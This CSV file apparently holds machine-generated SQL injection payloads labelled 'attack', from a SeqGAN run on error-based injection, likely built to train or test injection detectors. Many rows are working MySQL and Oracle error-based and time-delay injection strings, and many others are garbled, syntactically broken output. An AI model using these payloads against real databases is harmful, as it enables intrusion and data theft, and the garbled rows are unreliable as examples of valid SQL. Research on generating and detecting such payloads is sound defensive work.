label,payload,family,payload_type,method,run_id,sample_index
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'y' like 'xe' like 'wg'  =  'e"" like ""ep'  =  'zu'  =  'eu"" like ""' where 4244  =  4244 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1814
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1815
attack,-1272' or roluswus z,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1816
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxf""  =  ""x""  =  ""UWHERE'  =  'wx6vT""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gu'  =  'fvqHWHEREI.1006   (    )   or 1 group by concat  (  =  chr  (  113  )  a carljjn raddr.get_host_host_roles  )  ,)   then 1 else 0 select union end   )   ,:   )    )   dx information_schema.cha ancaroostst_rosw  (  chr  (  113  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1817
attack,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""nyb""  =  ""zvchdmsjbj",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1818
attack,1'  )   a ra mdr.mt_host_ymjjran anltes,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1819
attack,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""ox' where 1592  =  1592 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1820
attack,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyuoqupu'  =  'j'  =  'u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1821
attack,12852imbgu' like '_hbdu'  =  'nz,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1822
attack,"1%'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1823
attack,17562 where 6913  =  6567 chrusnul,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1824
attack,"1%'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1825
attack,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""hbmh' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '""  =  ""x""  =  ""E",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1826
attack,-5032'   )    )   --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1827
attack,"1""   )    )     )  ,0x717a767a71,floor  (  rand  (  5840,  )   and   (  select   (  case when   (  select 8488 dun_alelelelete_se ros  (  select chr  (  113  )  a ctcrara where r  (  ctxss  )  >  (  select chr  (  113  )  )   alte(  elts  (  chr  (  113  )  ||  (  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1828
attack,"1%o'  =  'x.u' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'a",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1829
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxfAsE",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1830
attack,"-5967 or AND 1 group by 1  =  6567 or 1 group by concat  (  5023,  (  1782 or LISYS.u22788190RDINor S2017'  =  'euzu_jh'  =  'eu'  =  'u'  =  'jouh' like 'uz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1831
attack,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'u'  =  'au'  =  'lip'  =  'jv",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1832
attack,"1   )    )   a where x  (  =  )   then 1 group by concat  (  1045,7562  )  )   )    )   )   or group by x  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1833
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lejdvbuhuh""  =  ""uh""  =  ""uh""  =  ""uouo",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1834
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1835
attack,"1'igduygggxs where g mbobu'  =  'uqlojybu'  =  'ouh""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1836
attack,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  """"   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""hbmg' where 1618  =  1618 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||''  =  'hku",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1837
attack,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1838
attack,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'yl'  =  'uquoujh""  =  ""jquh",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1839
attack,-1272%N,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1840
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1841
attack,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '6082xuhU""  =  ""ep'  =  'l."" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""p",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1842
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctacpul",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1843
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '%'  =  ''  =  'acph'  =  'h'  =  'tyu'  =  'ej_h.6236""  =  ""ivuh""  =  ""uh0x78ue",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1844
attack,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""oxx%'  =  'fpw'  =  'wherewfwss_egroup group by concat  (  concat  (  5840  )   then from information_schema.chararacMerrots  (  5023,7469  )  ||chr  (  case when   (  select whenx  )   --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1845
attack,1'   )    djdxhb,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1846
attack,"-6236'   )    )    AND 'i'  9325 or 6056 group by concat  (  =  6055,8666)   )    )     addx.d_set_host_host_aduretet_het_rost_host_1drost_hess  (  ||chr  (  106  )   5023  )  )   or 'i'  =  4345 or by 6055  =  )   as dual  )  )   ) from   )  )   then 1 when   (  select ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1847
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1848
attack,"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  """"  =  ""n' like 'w   )    )   x from information_schema.8877t_hostt  (  9474  )  )   )     )  ,S union DIST  =  )   as group by Nxp  (  =  )   dx altch duamsjsys",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1849
attack,1'+  (  select 'ubmbu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1850
attack,1'  )   and  eumnaddr.sn  (  3326,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1851
attack,-6085 or * AND 1 pole_host_tablt  (  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1852
attack,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'owfw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1853
attack,"-9740"" and   (  case counaswq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1854
attack,"162371'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'efuibr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1855
attack,"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""'du'  =  'ajrn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1856
attack,"||or 1 group by AS  =  4345 and from  >  (  )  ,concat  (  >  (  =  then from  (  chr  (  113 --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1857
attack,1%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1858
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%'  =  ''  =  'vu'  =  'du"" like ""jrqvcpjr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1859
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""jmvwq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1860
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1861
attack,1 andunlll~    )   SELECT rounall_lolipu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1862
attack,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'j'  =  'rv'  =  'j'  =  'bu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1863
attack, AND 1 group by concat  (  select   (  =  >  (  select   (  case when   (  =  (  select 8488 dual  (  chr  (  106  )   6237  )  ||charotss.p information_schema.5584 anars group by x  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1864
attack,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wuzv' where 1592  =  1592 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1865
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'jallwkb",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1866
attack,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ggcyp(,floor",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1867
attack,"1'   )    )     )  ,0x78   )    )   ,1   as group x group by x  )  a and from  (  chr  (  113  )   then mi dult  (  select cole  )  # ) where 3850 AS  =  (  2017 or group by concat  (  ||  )   or 9159 --olalS"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""M and row  (  9474  ) --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1868
attack,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'umsjv' like '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1869
attack,1   )    )   an moleite_hk where 3171  )  )   from dual  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1870
attack,1SELECTyqjm,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1871
attack,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""ivuh""  =  ""ibu' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1872
attack,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1873
attack," AND 1 group by concat  (  =  and,  (  c mina 9891untexe_hosep",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1874
attack," AND 1 group by concat  (  S R D  )  )   then 1 group by concat  (  =  5023,1  )  )   di dual  )  )   then mow  (  extractvalue  (  select   (      )   )   ,0x78   )    AND 'i'  =  (  )   then 1 group by x  )   or duletle_pleret_rost_name  )  )   a mina group min  (  select couan_h",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1875
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  ''  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1876
attack,"-7686%""  )   pr  (  chr  (  113  )  )   (  122  )   or 'i'  =  )   as FROM   (  case when   (  4386  )   ( select roocedr.sn  (  ||  (  select cou",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1877
attack,1   )    )     )   then 1 group by concat  (  select   (  select coun,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1878
attack,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1879
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kkxkgwg",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1880
attack,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1881
attack,"1%'  =  'aaq' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1882
attack,"-1272'   )    )   ,0x717a767a71   )      )     )  )  )  4386  )  chr  (  113  )  ||  (  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1883
attack, AND 1  =  utl_inubnimb,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1884
attack,"-1272'S ROWNueu"" like ""wue' like ''  =  'wu'  =  'wuu'  =  'wuhuj    u#",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1885
attack,-3362' or g where 6567  =  4493  a group pross'  =  'eue_hos  (  chr  (  case when   (  select count  )  )   as group by x  )   from duall  (  chr  (  106  )  )  )   di rolecose  )   #)     )   then 1 else 0 end   )     )   then 1 e  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1886
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""owfyvu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1887
attack,"1   )    )     )  ,  ||  (  2768 when   (  )  ,concat  (  5840  )   then 1 group by x  )  ||chr  (    )   or else 0 end   )   ,1   )   , ra 'i'  (  S counas  )   from   (  4232  =  )   then 1 e  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1888
attack,"1'||  (  select 'y' where 1618  =  1618 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'bt'  =  'gu'  =  'jz'  =  'eu'  =  'jbjqjsuq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1889
